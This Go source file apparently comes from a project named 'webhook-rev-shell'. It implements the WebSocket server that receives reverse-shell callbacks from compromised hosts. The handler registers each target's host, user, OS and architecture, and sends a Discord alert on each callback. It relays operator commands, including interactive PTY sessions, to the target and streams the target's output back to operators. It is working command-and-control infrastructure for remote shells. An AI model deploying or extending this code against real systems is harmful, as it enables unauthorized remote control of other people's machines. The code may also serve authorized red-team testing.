package transport

import (
	"context"
	"encoding/json"
	"errors"
	"net"
	"net/http"
	"time"

	chlog "github.com/charmbracelet/log"
	"github.com/go-chi/chi/v5"
	"github.com/google/uuid"
	"github.com/noahmagill/webhook-rev-shell/internal/broker"
	"github.com/noahmagill/webhook-rev-shell/internal/notify"
	"github.com/noahmagill/webhook-rev-shell/internal/operatorinput"
	"github.com/noahmagill/webhook-rev-shell/internal/protocol"
	"nhooyr.io/websocket"
)

type WSTargetHandler struct {
	B              *broker.Broker
	Discord        *notify.Discord
	OriginPatterns []string
}

func (h *WSTargetHandler) Connect(w http.ResponseWriter, r *http.Request) {
	sessionID := chi.URLParam(r, "id")
	secret := chi.URLParam(r, "secret")

	sess, err := h.B.Store().GetSession(sessionID)
	if err != nil || sess.Secret != secret {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	if sess.State == protocol.StateExpired || sess.State == protocol.StateKilled {
		http.Error(w, "session closed", http.StatusGone)
		return
	}

	conn, err := websocket.Accept(w, r, &websocket.AcceptOptions{
		OriginPatterns: h.OriginPatterns,
	})
	if err != nil {
		return
	}
	defer conn.Close(websocket.StatusNormalClosure, "")

	ctx, cancel := context.WithCancel(r.Context())
	defer cancel()

	// First message should be registration
	_, regData, err := conn.Read(ctx)
	if err != nil {
		return
	}
	var reg protocol.RegisterPayload
	if err := json.Unmarshal(regData, &reg); err != nil {
		conn.Close(websocket.StatusInvalidFramePayloadData, "bad register")
		return
	}

	targetID := uuid.New().String()[:8]
	mode := "command"
	if reg.Capabilities.PTY {
		mode = "pty"
	}

	target := &protocol.Target{
		ID:           targetID,
		SessionID:    sessionID,
		Host:         reg.Host,
		User:         reg.User,
		OS:           reg.OS,
		Arch:         reg.Arch,
		System:       reg.System,
		Capabilities: reg.Capabilities,
		Mode:         mode,
		Transport:    "websocket",
		LastSeen:     time.Now(),
	}

	tl, err := h.B.RegisterTarget(sessionID, target)
	if err != nil {
		if errors.Is(err, broker.ErrSessionHasActiveBeacon) {
			ack, _ := json.Marshal(map[string]string{
				"type":  "error",
				"error": "session has active beacon",
			})
			conn.Write(ctx, websocket.MessageText, ack)
		}
		return
	}
	defer h.B.RemoveTarget(sessionID, targetID)

	room := h.B.GetRoom(sessionID)
	if room == nil {
		return
	}

	ack, _ := json.Marshal(map[string]string{
		"type":      "registered",
		"target_id": targetID,
		"mode":      mode,
	})
	conn.Write(ctx, websocket.MessageText, ack)

	if h.Discord != nil && h.Discord.Enabled() {
		callbackIP := requestIPFromRemote(r.RemoteAddr)
		go func() {
			if err := h.Discord.CallbackConnected(sess, target, callbackIP); err != nil {
				chlog.Error("discord callback notify failed", "session_id", sessionID, "callback_ip", callbackIP, "transport", "websocket", "err", err)
			}
		}()
	}

	go func() {
		ticker := time.NewTicker(20 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				pingCtx, pingCancel := context.WithTimeout(ctx, 5*time.Second)
				err := conn.Ping(pingCtx)
				pingCancel()
				if err != nil {
					cancel()
					return
				}
				tl.Touch()
			}
		}
	}()

	// Read from target -> broadcast to operators
	go func() {
		defer cancel()
		for {
			_, data, err := conn.Read(ctx)
			if err != nil {
				return
			}
			room.Transcript.Write(data)
			room.BroadcastToOperators(data)
			h.B.Touch(sessionID)
			room.TouchClaim(targetID)
			tl.Touch()
		}
	}()

	for {
		select {
		case cmd := <-tl.CmdQueue:
			room.TouchClaim(targetID)
			tl.Touch()
			msgType := websocket.MessageBinary
			if operatorinput.IsResizeMessage(cmd) {
				msgType = websocket.MessageText
			}
			if err := conn.Write(ctx, msgType, cmd); err != nil {
				return
			}
		case <-ctx.Done():
			return
		case <-tl.Done:
			return
		}
	}
}

func requestIPFromRemote(remoteAddr string) string {
	host, _, err := net.SplitHostPort(remoteAddr)
	if err == nil {
		return host
	}
	return remoteAddr
}
